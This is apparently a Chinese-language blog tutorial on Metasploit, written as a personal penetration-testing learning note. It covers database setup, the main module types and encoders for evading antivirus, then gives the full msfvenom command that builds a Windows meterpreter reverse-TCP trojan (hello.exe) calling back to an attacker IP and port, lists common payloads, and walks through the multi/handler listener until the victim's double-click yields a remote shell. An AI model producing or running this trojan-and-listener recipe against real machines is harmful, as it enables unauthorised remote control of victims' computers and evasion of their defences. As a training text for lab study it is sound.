## metasploit的使用

### 一、msf基本操作

1\. 使用msfconsole进入msf控制台界面

2\. 在控制台使用msfdb init初始化数据库（创建数据库），这边由于我之前操作过一次所以显示已经开启了，msfdb
start开启数据库，然后在命令行模式下开启开机自启动数据库（systemctl enable postgresql） ，然后开启数据库服务（service
postgresql start）

3\. 查看数据库密码

cat /usr/share/metasploit-framework/config/database.yml  
  
---  
  
  

4\. 数据库连接

db_connect msf:密码=@127.0.0.1/msf  
  
---  
  
  

### 二、msf模块(比较重要的四个)

渗透模块(exploit):这是一段程序，运行时会利用目标的安全漏洞进行攻击。

攻击载荷(payload):在成功对目标完成一次渗透之后，这段程序开始在目标计算机上运行。它能帮助我们在目标系统上获得需要的访问和行动权限。

辅助模块(auxiliary):包含了一系列的辅助支持模块，包括扫描模块、fuzz测试漏洞发掘模块、网络协议欺骗以及其他一些模块。

编码模块(encoder):编码器模块通常用来对攻击模块进行代码混淆，来逃过目标安全保护机制的检测。目标安全保护机制包括杀毒软件和防火墙等。  
  
---  
  
个人理解：用辅助模块查找发现漏洞，发现漏洞用渗透模块对漏洞进行攻击，成功渗透进去后将存放在传输器(stage)的攻击载荷通过传输体(stager)传输到目标机器上面，运行，获得权限;编码模块是用来对攻击载荷的木马进行封装逃避杀毒软件和防火墙。

### 三、木马生成

1\. 使用msfvenom生成木马

[![wps6\[4\]](https://image.3001.net/images/20201116/1605501713.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111104559571-293275814.jpg)

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.227.129 LPORT=4444
-f exe -o hello.exe

-p：payload 设置payload

-a：architecture（结构） 设置系统位数 x86 | x64 不写默认x86

\--platform 设置平台 windows | linux

-e：encoder（编码） 设置编码

-i：iteration（迭代） 编码偏移次数

-f：format（格式） 文件格式

-o：output 输出文件

\--list | -l 查看指令详细信息，如：msfvenom --list e

 **常用的payload**

windows/x64/meterpreter/reverse_tcp

windows/x64/meterpreter/reverse_tcp_rc4

windows/x64/meterpreter/bind_tcp

windows/x64/meterpreter/bind_tcp_rc4

windows/x64/meterpreter/reverse_https

windows/x64/meterpreter/reverse_http  
  
---  
  
  

理解：因为采用的是反向连接所有这边木马要带上本机的操作地址和监听的端口号，这边假如有些-a的话，那windows/后面就需要跟上-a 带的数比如-a x64
就要windows/x64/meterpreter

### 四、开启监听模块（最常用的模块）

1\. 配置监听模块

use exploit/multi/handler  
  
---  
  
  

2\. 设置payload

set payload windows/meterpreter/reverse_tcp 这里需要跟木马的-p一样  
  
---  
  
  

3\. 查看参数

show options 查看参数

LHOST ip 本机IP地址

LPORT 4444 本机端口  
  
---  
  
  

4\. 设置参数信息LHOST(ip)和LPORT(端口)

set LHOST 192.168.227.129

set LPORT 4444  
  
---  
  
  

5\. 开启监听

exploit或者run 开启监听  
  
---  
  
  

6\. windows电脑双击exe文件，kali就可以是使用windows的cmd了

附录：我博客园的链接[内网渗透 day3](https://www.cnblogs.com/caihon/p/13957511.html)

